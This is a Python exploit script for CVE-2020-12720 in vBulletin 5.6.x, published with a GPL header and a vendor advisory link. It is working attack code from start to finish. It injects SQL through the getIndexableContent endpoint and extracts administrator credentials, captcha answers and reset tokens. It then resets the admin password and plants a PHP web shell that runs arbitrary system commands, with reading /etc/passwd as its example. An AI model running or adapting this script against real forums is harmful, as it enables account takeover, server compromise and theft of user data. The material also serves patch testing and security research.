# Exploit Author: Photubias
# Vendor Advisory: [1] https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4440032-vbulletin-5-6-1-security-patch-level-1
# Version: vBulletin v5.6.x (prior to Patch Level 1)
# Tested on: vBulletin v5.6.1 on Debian 10 x64
# CVE: CVE-2020-12720 vBulletin v5.6.1 (SQLi) with path to RCE

#!/usr/bin/env python3
&#039;&#039;&#039;

    
	Copyright 2020 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name CVE-2020-12720.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This is a native implementation without requirements, written in Python 3.
        Works equally well on Windows as Linux (as MacOS, probably ;-)
        
        ##-->> Full creds to @zenofex and @rekter0 <<--##
&#039;&#039;&#039;
import urllib.request, urllib.parse, sys, http.cookiejar, ssl, random, string

## Static vars; change at will, but recommend leaving as is
sADMINPASS = &#039;12345678&#039;
sCMD = &#039;id&#039;
sURL = &#039;http://192.168.50.130/&#039;
sUSERID = &#039;1&#039;
sNEWPASS = &#039;87654321&#039;
iTimeout = 5

## Ignore unsigned certs
ssl._create_default_https_context = ssl._create_unverified_context

## Keep track of cookies between requests
cj = http.cookiejar.CookieJar()
oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return &#039;&#039;.join(random.choice(letters) for i in range(stringLength))

def getData(sUrl, lData):
    try:
        oData = urllib.parse.urlencode(lData).encode()
        oRequest = urllib.request.Request(url = sUrl, data = oData)
        return oOpener.open(oRequest, timeout = iTimeout)
    except:
        print(&#039;----- ERROR, site down?&#039;)
        sys.exit(1)

def verifyBug(sURL,sUserid=&#039;1&#039;):
    sPath = &#039;ajax/api/content_infraction/getIndexableContent&#039;
    lData = {&#039;nodeId[nodeid]&#039; : &#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,"cve-2020-12720",8,7,6,5,4,3,2,1;--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if not &#039;cve-2020-12720&#039; in sResponse:
        print(&#039;[!] Warning: not vulnerable to CVE-2020-12720, credentials are needed!&#039;)
        return False
    else:
        print(&#039;[+] SQLi Success!&#039;)
        return True

def takeoverAccount(sURL, sNEWPASS):
    sPath = &#039;ajax/api/content_infraction/getIndexableContent&#039;
    ### Source: https://github.com/rekter0/exploits/tree/master/CVE-2020-12720
    ## Get Table Prefixes
    lData = {&#039;nodeId[nodeid]&#039; : &#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,table_name,8,7,6,5,4,3,2,1 from information_schema.columns WHERE column_name=\&#039;phrasegroup_cppermission\&#039;;--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#039;rawtext&#039; in sResponse: sPrefix = sResponse.split(&#039;rawtext&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;).replace(&#039;language&#039;,&#039;&#039;)
    else: sPrefix = &#039;&#039;

    ## Get usergroup ID for "Administrators"
    lData = {&#039;nodeId[nodeid]&#039; : &#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,usergroupid,8,7,6,5,4,3,2,1 from &#039; + sPrefix + &#039;usergroup WHERE title=\&#039;Administrators\&#039;;--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    sGroupID = sResponse.split(&#039;rawtext&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;)
    #print(&#039;[+] Administrators Group ID: &#039;+sGroupID)
    
    ## Get admin data, including original token (password hash), TODO: an advanced exploit could restore the original hash in post exploitation
    lData = {&#039;nodeId[nodeid]&#039; : &#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,concat(username,0x7c,userid,0x7c,email,0x7c,token),8,7,6,5,4,3,2,1 from &#039; + sPrefix + &#039;user where usergroupid=&#039; + sGroupID + &#039;;--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    sUsername,sUserid,sUsermail,sUserTokenOrg = sResponse.split(&#039;rawtext&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;).split(&#039;|&#039;)
    #print(&#039;[+] Got original token (&#039; + sUsername + &#039;, &#039; + sUsermail + &#039;): &#039; + sUserTokenOrg)

    ## Let&#039;s create a Human Verify Captcha
    sPath = &#039;ajax/api/hv/generateToken?&#039;
    lData = {&#039;securitytoken&#039;:&#039;guest&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#039;hash&#039; in sResponse: sHash = sResponse.split(&#039;hash&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;)
    else: sHash = &#039;&#039;

    ## Get the captcha answer from DB
    sPath = &#039;ajax/api/content_infraction/getIndexableContent&#039;
    lData = {&#039;nodeId[nodeid]&#039;:&#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,count(answer),8,7,6,5,4,3,2,1 from &#039; + sPrefix + &#039;humanverify limit 0,1--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#039;rawtext&#039; in sResponse: iAnswers = int(sResponse.split(&#039;rawtext&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;))
    else: iAnswers = 1

    lData = {&#039;nodeId[nodeid]&#039;:&#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,answer,8,7,6,5,4,3,2,1 from &#039; + sPrefix + &#039;humanverify limit &#039; + str(iAnswers-1) + &#039;,1--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#039;rawtext&#039; in sResponse: sAnswer = sResponse.split(&#039;rawtext&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;)
    else: sAnswer = &#039;&#039;

    ## Now request PW reset and retrieve the token
    sPath = &#039;auth/lostpw&#039;
    lData = {&#039;email&#039;:sUsermail,&#039;humanverify[input]&#039;:sAnswer,&#039;humanverify[hash]&#039;:sHash,&#039;securitytoken&#039;:&#039;guest&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    
    sPath = &#039;ajax/api/content_infraction/getIndexableContent&#039;
    lData = {&#039;nodeId[nodeid]&#039;:&#039;1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,activationid,8,7,6,5,4,3,2,1 from &#039; + sPrefix + &#039;useractivation WHERE userid=&#039; + sUserid + &#039; limit 0,1--&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if &#039;rawtext&#039; in sResponse: sToken = sResponse.split(&#039;rawtext&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;).replace(&#039;"&#039;,&#039;&#039;)
    else: sToken = &#039;&#039;

    ## Finally the password reset itself
    sPath = &#039;auth/reset-password&#039;
    lData = {&#039;userid&#039;:sUserid,&#039;activationid&#039;:sToken,&#039;new-password&#039;:sNEWPASS,&#039;new-password-confirm&#039;:sNEWPASS,&#039;securitytoken&#039;:&#039;guest&#039;}
    sResponse = getData(sURL + sPath, lData).read().decode()
    if not &#039;Logging in&#039; in sResponse:
        print(&#039;[-] Failed to reset the password&#039;)
        return &#039;&#039;
    else:
        print(&#039;[+] Success! User &#039; + sUsername + &#039; now has password &#039; + sNEWPASS)
    return sUserid

def createBackdoor(sURL, sADMINPASS, sUserid=&#039;1&#039;):
    ## Activating Sitebuilder
    sPath = &#039;ajax/activate-sitebuilder&#039;
    lData = {&#039;pageid&#039;:&#039;1&#039;, &#039;nodeid&#039;:&#039;0&#039;,&#039;userid&#039;:&#039;1&#039;,&#039;loadMenu&#039;:&#039;false&#039;, &#039;isAjaxTemplateRender&#039;:&#039;true&#039;, &#039;isAjaxTemplateRenderWithData&#039;:&#039;true&#039;,&#039;securitytoken&#039;:&#039;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#039;}
    oResponse = getData(sURL + sPath, lData)
    if not oResponse.code == 200:
        print(&#039;[-] Error activating sitebuilder&#039;)
        sys.exit(1)

    ## Confirming the password, getting new securitytoken
    sPath = &#039;auth/ajax-login&#039;
    lData = {&#039;logintype&#039;:&#039;cplogin&#039;,&#039;userid&#039;:sUserid,&#039;password&#039;:sADMINPASS,&#039;securitytoken&#039;:&#039;1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12&#039;}
    oResponse = getData(sURL + sPath, lData)
    sResponse = oResponse.read().decode()
    if &#039;lostpw&#039; in sResponse:
        print(&#039;[-] Error: authentication for userid &#039; + sUserid + &#039; failed&#039;)
        sys.exit(1)
    sToken = sResponse.split(&#039;,&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;"&#039;,&#039;&#039;).replace(&#039;}&#039;,&#039;&#039;)
    print(&#039;[+] Got token: &#039;+sToken)

    ## cpsession is needed, use this for extra verification
    #for cookie in cj: print(cookie.name, cookie.value, cookie.domain) #etc etc

    ## First see if our backdoor does not already exists
    sPath = &#039;ajax/render/admin_sbpanel_pagelist_content_wrapper&#039;
    lData = {&#039;isAjaxTemplateRenderWithData&#039;:&#039;true&#039;,&#039;securitytoken&#039;:sToken}
    oResponse = getData(sURL + sPath, lData)
    sResponse = oResponse.read().decode()
    if &#039;cve-2020-12720&#039; in sResponse:
        sPageName = &#039;cve-2020-12720-&#039; + sResponse.split(&#039;/cve-2020-12720-&#039;)[1].split(&#039;)&#039;)[0]
        print(&#039;[+] This machine was already pwned, using "&#039; + sPageName + &#039;" for your command&#039;)
        return sPageName
    

    ## Create a new empty page
    sPath = &#039;ajax/api/widget/saveNewWidgetInstance&#039;
    lData = {&#039;containerinstanceid&#039;:&#039;0&#039;,&#039;widgetid&#039;:&#039;23&#039;,&#039;pagetemplateid&#039;:&#039;&#039;,&#039;securitytoken&#039;:sToken}
    oResponse = getData(sURL + sPath, lData)
    sResponse = oResponse.read().decode()
    sWidgetInstanceID = sResponse.split(&#039;,&#039;)[0].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;)
    sPageTemplateID = sResponse.split(&#039;,&#039;)[1].split(&#039;:&#039;)[1].replace(&#039;}&#039;,&#039;&#039;)
    print(&#039;[+] Got WidgetInstanceID: &#039;+sWidgetInstanceID+&#039; and PageTemplateID: &#039;+sPageTemplateID)

    ## Now submitting the page content
    sPageName = &#039;cve-2020-12720-&#039;+randomString()
    sPath = &#039;ajax/api/widget/saveAdminConfig&#039;
    lData = {&#039;widgetid&#039;:&#039;23&#039;,
             &#039;pagetemplateid&#039;:sPageTemplateID,
             &#039;widgetinstanceid&#039;:sWidgetInstanceID,
             &#039;data[widget_type]&#039;:&#039;&#039;,
             &#039;data[title]&#039;:sPageName,
             &#039;data[show_at_breakpoints][desktop]&#039;:&#039;1&#039;,
             &#039;data[show_at_breakpoints][small]&#039;:&#039;1&#039;,
             &#039;data[show_at_breakpoints][xsmall]&#039;:&#039;1&#039;,
             &#039;data[hide_title]&#039;:&#039;0&#039;,
             &#039;data[module_viewpermissions][key]&#039;:&#039;show_all&#039;,
             &#039;data[code]&#039;:"echo(&#039;###SHELLRESULT###&#039;);system($_GET[&#039;cmd&#039;]);echo(&#039;###SHELLRESULT###&#039;);",
             &#039;securitytoken&#039;:sToken}
    oResponse = getData(sURL + sPath, lData)
    if not oResponse.code == 200: print(&#039;[!] Error submitting page content for &#039; + sPageName)
    
    ## Finally saving the new page
    sPath = &#039;admin/savepage&#039;
    lData = {&#039;input[ishomeroute]&#039;:&#039;0&#039;,
             &#039;input[pageid]&#039;:&#039;0&#039;,
             &#039;input[nodeid]&#039;:&#039;0&#039;,
             &#039;input[userid]&#039;:&#039;1&#039;,
             &#039;input[screenlayoutid]&#039;:&#039;2&#039;,
             &#039;input[templatetitle]&#039;:sPageName,
             &#039;input[displaysections[0]]&#039;:&#039;[{"widgetId":"23","widgetInstanceId":"&#039; + sWidgetInstanceID + &#039;"}]&#039;,
             &#039;input[displaysections[1]]&#039;:&#039;[]&#039;,
             &#039;input[displaysections[2]]&#039;:&#039;[]&#039;,
             &#039;input[displaysections[3]]&#039;:&#039;[]&#039;,
             &#039;input[pagetitle]&#039;:sPageName,
             &#039;input[resturl]&#039;:sPageName,
             &#039;input[metadescription]&#039;:&#039;Photubias+Shell&#039;,
             &#039;input[pagetemplateid]&#039;:sPageTemplateID,
             &#039;url&#039;:sURL,
             &#039;securitytoken&#039;:sToken}
    oResponse = getData(sURL + sPath, lData)
    if not oResponse.code == 200: print(&#039;[!] Error saving page content for &#039; + sPageName)
    return sPageName

def main():
    if len(sys.argv) == 1:
        print(&#039;[!] No arguments found: python3 CVE-2020-12720.py <URL> <CMD>&#039;)
        print(&#039;    Example: ./CVE-2020-12720.py http://192.168.50.130/ "cat /etc/passwd"&#039;)
        print(&#039;    But for now, ask questions then&#039;)
        sURL = input(&#039;[?] Please enter the address and path to vBulletin ([http://192.168.50.130/): &#039;)
        if sURL == &#039;&#039;: sURL = &#039;http://192.168.50.130&#039;
    else:
        sURL = sys.argv[1]
        sCMD = sys.argv[2]
    if not sURL[:-1] == &#039;/&#039;: sURL += &#039;/&#039;
    if not sURL[:4].lower() == &#039;http&#039;: sURL = &#039;http://&#039; + sURL
    print(&#039;[+] Welcome, first verifying the SQLi vulnerability&#039;)
    if verifyBug(sURL):
        print("----\n" + &#039;[+] Attempting automatic admin account takeover&#039;)
        sUSERID = takeoverAccount(sURL, sNEWPASS)
        sADMINPASS = sNEWPASS
        if sUSERID == &#039;&#039;:
            sUSERID = &#039;1&#039;
            sADMINPASS = input(&#039;[?] Please enter the admin password (userid &#039; + sUSERID + &#039;): &#039;)
    else:
        sADMINPASS = input(&#039;[?] Please enter the admin password (userid &#039; + sUSERID + &#039;): &#039;)
    print("----\n"+&#039;[+] So far so good, attempting the creation of the backdoor&#039;)
    sPageName = createBackdoor(sURL, sADMINPASS, sUSERID)

    if len(sys.argv) == 1: sCMD = input(&#039;[?] Please enter the command to run [id]: &#039;)
    if sCMD == &#039;&#039;: sCMD = &#039;id&#039;
    sCmd =  urllib.parse.quote(sCMD)
    sPath = sPageName + "?cmd=" + sCmd

    print(&#039;[+] Opening &#039;+sURL + sPath)
    try:
        oRequest = urllib.request.Request(url = sURL + sPath)
        oResponse = oOpener.open(oRequest, timeout = iTimeout)
        print(&#039;#######################&#039;)
        sResponse = oResponse.read().decode()
        print(&#039;[+] Command result:&#039;)
        print(sResponse.split(&#039;###SHELLRESULT###&#039;)[1])
    except:
        print(&#039;[-] Something went wrong, bad command?&#039;)
        sys.exit(1)


if __name__ == "__main__":
    main()

